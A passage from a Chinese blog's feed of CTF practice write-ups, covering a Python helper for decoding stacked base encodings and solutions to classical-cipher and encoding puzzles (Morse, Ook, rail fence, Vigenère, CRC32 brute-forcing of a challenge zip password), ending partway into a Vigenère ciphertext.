i += 1</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h1 id="10-base家族解密"><a href="#10-base家族解密" class="headerlink" title="10.base家族解密"></a>10.base家族解密</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">def base_family(self,content):</span><br><span class="line">    try:</span><br><span class="line">        num = []</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                content = base64.b16decode(content).decode()</span><br><span class="line">                num.append(&#x27;base16&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = base64.b32decode(content).decode()</span><br><span class="line">                num.append(&#x27;base32&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = base36.dumps(content).decode()</span><br><span class="line">                num.append(&#x27;base36&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = base58.b58decode(content).decode()</span><br><span class="line">                num.append(&#x27;base58&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = base64.b64decode(content).decode()</span><br><span class="line">                num.append(&#x27;base64&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = base64.b85decode(content).decode()</span><br><span class="line">                num.append(&#x27;base85&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = base64.a85decode(content).decode()</span><br><span class="line">                num.append(&#x27;base85&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = base91.decode(content).decode()</span><br><span class="line">                num.append(&#x27;base91&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = py3base92.b92decode(content).decode()</span><br><span class="line">                num.append(&#x27;base92&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            try:</span><br><span class="line">                content = b&#x27;&#x27;.join(base128.base128(chars=None, chunksize=7).decode(content)).decode()</span><br><span class="line">                num.append(&#x27;base128&#x27;)</span><br><span class="line">                continue</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            break</span><br><span class="line">        print(&quot;加密顺序&quot;,num)</span><br><span class="line">        print(&quot;base族谱解密结果：&quot;,content)</span><br><span class="line">        return content</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;base族谱解密-------------------------------解密失败&#x27;)</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
          <category> python </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> python </tag>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bmz刷题目记录</title>
      <link href="/article/2022-03-02-bmz%E5%88%B7%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/article/2022-03-02-bmz%E5%88%B7%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>bmz刷题目记录</p><span id="more"></span><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="4进制"><a href="#4进制" class="headerlink" title="4进制"></a>4进制</h2><p>有附件，附件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331</span><br></pre></td></tr></table></figure><p>可以根据题目名称可以知道需要用四进制转换成十进制，然后十进制转换成字符得到flag，exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=&#x27;1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in a.split(&#x27; &#x27;):</span><br><span class="line">    sum=0</span><br><span class="line">    for j in range(len(i)):</span><br><span class="line">        sum+=int(i[j])*(4**(len(i)-j-1))</span><br><span class="line">    #print(sum)</span><br><span class="line">    flag+=chr(sum)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="2018-AFCTF-Morse"><a href="#2018-AFCTF-Morse" class="headerlink" title="2018 AFCTF Morse"></a>2018 AFCTF Morse</h2><p>有附件，附件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..</span><br></pre></td></tr></table></figure><p>首先将莫斯解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61666374667B317327745F73305F333435797D</span><br></pre></td></tr></table></figure><p>然后将上面的16进制转码得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afctf&#123;1s&#x27;t_s0_345y&#125;</span><br></pre></td></tr></table></figure><h2 id="2018-HEBTUCTF-社会主义接班人"><a href="#2018-HEBTUCTF-社会主义接班人" class="headerlink" title="2018 HEBTUCTF 社会主义接班人"></a>2018 HEBTUCTF 社会主义接班人</h2><p>有附件，附件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">身为社会主义接班人的你，核心价值观你会背吗？</span><br><span class="line"></span><br><span class="line">自由爱国自由平等自由文明平等自由平等平等自由和谐平等自由自由公正法治诚信民主公正平等公正友善自由法治公正公正友善敬业法治公正公正自由公正民主法治和谐公正公正公正诚信富强公正公正法治公正公正友善法治法治文明公正公正公正友善法治法治和谐公正自由公正平等公正诚信和谐法治爱国公正友善自由法治诚信和谐</span><br></pre></td></tr></table></figure><p>社会主义核心价值观解密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEBTUCTF&#123;ejvovdasfjfvmrfmsdemxj&#125;</span><br></pre></td></tr></table></figure><h2 id="Ook"><a href="#Ook" class="headerlink" title="Ook"></a>Ook</h2><p>有附件，附件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.</span><br><span class="line">Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. </span><br></pre></td></tr></table></figure><p>ook解码得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1c470f09af4c86b7&#125;</span><br></pre></td></tr></table></figure><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p>得到信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fa&#123;660cb679d7866ffalg7d27e041cfbd18ed&#125;</span><br></pre></td></tr></table></figure><p>栅栏为2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;76d6207ceb064719cdf7b8d6168fefda&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p>描述信息和附件内容：影分身之术*40</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">太多了</span><br></pre></td></tr></table></figure><p>根据题目可以知道大概是base64加密了40次，于是写出exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">with open(&#x27;easybase-4-.txt&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">    content=f.readlines()[0]</span><br><span class="line">    print(content)</span><br><span class="line">for a in range(40):</span><br><span class="line">    print(base64.b64decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;))</span><br><span class="line">    content=base64.b64decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;S0_many_Bas3&#125;</span><br></pre></td></tr></table></figure><h2 id="栅栏中的base"><a href="#栅栏中的base" class="headerlink" title="栅栏中的base"></a>栅栏中的base</h2><p>得到附件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4C4A5645455232524B3533544B544C4C4A5A5545324D434749564E48553344474A564548495A53524E595944323D3D3D</span><br></pre></td></tr></table></figure><p>首先将内容转成base16解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LJVEER2RK53TKTLLJZUE2MCGIVNHU3DGJVEHIZSRNYYD2===</span><br></pre></td></tr></table></figure><p>然后base32解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZjBGQWw5MkNhM0FEZzlfMHtfQn0=</span><br></pre></td></tr></table></figure><p>然后base64解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f0FAl92Ca3ADg9_0&#123;_B&#125;</span><br></pre></td></tr></table></figure><p>然后栅栏字数是5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0939_F2A_BACD0&#125;</span><br></pre></td></tr></table></figure><h2 id="2018-HEBTUCTF-Sudoku-amp-Viginere"><a href="#2018-HEBTUCTF-Sudoku-amp-Viginere" class="headerlink" title="2018 HEBTUCTF Sudoku&amp;Viginere"></a>2018 HEBTUCTF Sudoku&amp;Viginere</h2><p>得到附件内容</p><img src="/image/media/2022/ctf/bmz/img/1.png" style="zoom:70%;" /><p>完成拼图得到</p><p><img src="/image/media/2022/ctf/bmz/img/2.png"></p><p>然后根据提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">After solving Sudoku, you will find Viginere&#x27;s secret:45 34 57 74 15 35 26 86 47 39 </span><br></pre></td></tr></table></figure><p>有点像坐标一样的找到对应的值但是考虑到先行后列或者先列后行，所以有两种可能的结果</p><p>结果一：rry55t1r13</p><p>结果二：15_1t_3a5y</p><p>尝试提交之后是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEBTUCTF&#123;15_1t_3a5y&#125;</span><br></pre></td></tr></table></figure><h2 id="CRC32-BOOM！"><a href="#CRC32-BOOM！" class="headerlink" title="CRC32 BOOM！"></a>CRC32 BOOM！</h2><p>得到zip附件，被加密，有两个txt和一个jpg，根据题目可以知道大概是需要对CRC进行爆破，观察文件大小后，主要对txt的CRC进行爆破</p><p><img src="/image/media/2022/ctf/bmz/img/3.png"></p><p>8e234ae0爆破结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">4 bytes: &#123;0x76, 0xa2, 0x0b, 0xe1&#125;</span><br><span class="line">verification checksum: 0x8115a277 (OK)</span><br><span class="line">alternative: 1x5NQ8 (OK)</span><br><span class="line">alternative: 9O2a5H (OK)</span><br><span class="line">alternative: G1qi4N (OK)</span><br><span class="line">alternative: IsCdeH (OK)</span><br><span class="line">alternative: NjDZOc (OK)</span><br><span class="line">alternative: OvJ7Un (OK)</span><br><span class="line">alternative: P8CUk2 (OK)</span><br><span class="line">alternative: PT0xov (OK)</span><br><span class="line">alternative: QTqIto (OK)</span><br><span class="line">alternative: Rh5f6k (OK)</span><br><span class="line">alternative: XBiGbJ (OK)</span><br><span class="line">alternative: Z3AdV_ (OK)</span><br><span class="line">alternative: gsombC (OK)</span><br><span class="line">alternative: mY3L6b (OK)</span><br><span class="line">alternative: newctf (OK)</span><br><span class="line">alternative: p7plP7 (OK)</span><br><span class="line">alternative: t3mmQT (OK)</span><br><span class="line">alternative: vBENeA (OK)</span><br></pre></td></tr></table></figure><p>8115a277爆破结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">4 bytes: &#123;0x0e, 0xf5, 0x08, 0x69&#125;</span><br><span class="line">verification checksum: 0x8e234ae0 (OK)</span><br><span class="line">alternative: 17LE1V (OK)</span><br><span class="line">alternative: 53QD05 (OK)</span><br><span class="line">alternative: 5Cm55e (OK)</span><br><span class="line">alternative: 6cfFvu (OK)</span><br><span class="line">alternative: 9l8GQb (OK)</span><br><span class="line">alternative: BzTRNZ (OK)</span><br><span class="line">alternative: EcSldq (OK)</span><br><span class="line">alternative: HqVcs7 (OK)</span><br><span class="line">alternative: JpB1Br (OK)</span><br><span class="line">alternative: LuKbrT (OK)</span><br><span class="line">alternative: TRyOcs (OK)</span><br><span class="line">alternative: _5IbAC (OK)</span><br><span class="line">alternative: bugku_ (OK)</span><br><span class="line">alternative: dpn8Ey (OK)</span><br><span class="line">alternative: mz9jRH (OK)</span><br><span class="line">alternative: q5ekFH (OK)</span><br><span class="line">alternative: w0l8vn (OK)</span><br><span class="line">alternative: yOOyO0 (OK)</span><br><span class="line">alternative: zRUFdx (OK)</span><br></pre></td></tr></table></figure><p>观察两个结果，在第一个结果里面有newctf，第二个结果里面有bugku_，所以猜测密码为bugku_newctf猜中了，要是没猜中可以试试把两个结果拼起来组成一个字典去跑</p><p>用压缩密码解压得到jpg图片，不能直接打开，用010查看得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Crcrcrcrc_32_BOOM&#125;</span><br></pre></td></tr></table></figure><h2 id="【2021医疗行业CTF】base编码"><a href="#【2021医疗行业CTF】base编码" class="headerlink" title="【2021医疗行业CTF】base编码"></a>【2021医疗行业CTF】base编码</h2><p>得到内容</p><p>R1kzRE1RWldHRTNET04yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSVEdNWlRFTktHR01ZVEdOUlZJWTNES05SUkc0WlRPT0pWSVkzREVOUlJHNFpUTU5KWElRPT09PT09</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64得到&gt;</span><br><span class="line">GY3DMQZWGE3DON2CGYZDMMJXGM3DKMZWGM2DKRRTGMZTENKGGMYTGNRVIY3DKNRRG4ZTOOJVIY3DENRRG4ZTMNJXIQ======</span><br><span class="line">base32得到&gt;</span><br><span class="line">666C61677B6261736536345F33325F31365F656173795F626173657D</span><br><span class="line">base16解密&gt;</span><br><span class="line">flag&#123;base64_32_16_easy_base&#125;</span><br></pre></td></tr></table></figure><h2 id="2018-AFCTF-Vigenere"><a href="#2018-AFCTF-Vigenere" class="headerlink" title="2018 AFCTF Vigenère"></a>2018 AFCTF Vigenère</h2><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">Yzyj ia zqm Cbatky kf uavin rbgfno ig hnkozku fyyefyjzy sut gha pruyte gu famooybn bhr vqdcpipgu jaaju 